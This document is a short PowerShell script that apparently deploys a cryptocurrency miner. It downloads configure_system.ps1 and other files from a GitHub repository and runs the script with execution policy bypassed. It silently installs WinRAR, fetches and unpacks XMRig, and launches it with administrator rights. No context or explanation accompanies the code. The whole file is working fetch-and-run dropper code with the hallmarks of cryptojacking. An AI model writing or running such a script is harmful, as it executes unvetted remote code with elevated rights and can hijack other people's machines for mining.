Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/configure_system.ps1 -OutFile C:\configure_system.ps1
powershell.exe -ExecutionPolicy Bypass -File "C:\configure_system.ps1"
Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/XRPSETUP.vbs -OutFile C:\XRPSETUP.vbs
Invoke-WebRequest -Uri 'https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-x64-701.exe' -OutFile 'C:\winrar-x64-701.exe'
Start-Process -FilePath 'C:\winrar-x64-701.exe' -ArgumentList '/S' -Verb RunAs
Invoke-WebRequest -Uri https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-gcc-win64.zip -OutFile C:\xmrig-6.22.2-gcc-win64.zip
& 'C:\Program Files\WinRAR\WinRAR.exe' x -ibck -y 'C:\xmrig-6.22.2-gcc-win64.zip' 'C:\'
Start-Sleep -Seconds 3
Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/coin/main/ZEPHSETUP.rar -OutFile C:\ZEPHSETUP.rar
& 'C:\Program Files\WinRAR\WinRAR.exe' x -ibck -y 'C:\ZEPHSETUP.rar' 'C:\'
Start-Sleep -Seconds 2
Copy-Item -Path C:\ZEPHYRUN.bat -Destination C:\xmrig-6.22.2\ZEPHYRUN.bat -Force
Copy-Item -Path C:\config.json -Destination C:\xmrig-6.22.2\config.json -Force
Start-Process -FilePath 'C:\xmrig-6.22.2\ZEPHYRUN.bat' -ArgumentList '/S' -Verb RunAs
powershell.exe exit
